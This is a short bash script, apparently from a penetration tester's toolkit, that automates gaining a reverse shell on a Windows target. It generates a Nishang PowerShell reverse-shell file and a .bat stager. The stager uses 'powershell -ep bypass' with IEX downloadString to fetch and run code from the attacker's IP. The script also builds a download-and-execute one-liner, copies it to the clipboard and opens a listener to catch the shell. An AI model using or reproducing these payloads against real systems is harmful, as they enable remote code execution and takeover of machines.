#!/bin/bash
source /root/Ops/Commands/colors.sh
if [ $# -eq 0 ]; then
  echo "Usage:"
  echo "bash backup_shell.sh [reverse port] [windows file location with double slashes]"
  exit 1
fi
IP=$( IP_No_Clip );
New_IP=$( echo -n $IP );

echo -e "${YELLOW}[+] Creating Nishang PS1 file.";
echo -e "${CYAN}Nishang $1";
Nishang $1;
echo -e "${GREEN}Nishang PS1 file created.\n";

echo -e "${YELLOW}[+] Creating bat file.";
echo -e "${CYAN}Nishang $1";
echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString(\'http://$IP:80/reverse_$1.ps1\')\""> backup_$1.bat;
echo -e "${GREEN} Bat file created.\n";

echo -e "${YELLOW}[+] Generate Windows cmd and copying to clipboard.";
echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.36:80/backup_$1.bat','backup_$1.bat')\";Start-Process -NoNewWindow '$2backup_$1.bat'" | clip
echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.36:80/backup_$1.bat','backup_$1.bat')\";Start-Process -NoNewWindow '$2backup_$1.bat'"
echo -e "${GREEN} Windows cmd copied to clipboard.\n";

echo -e "${YELLOW}[+] Opening a listener for you to get the shell.";
echo -e "${CYAN}wrev $1";

echo -e "${GREEN}Ready...Execute copy clipboard to target and execute, please :)";

wrev $1;
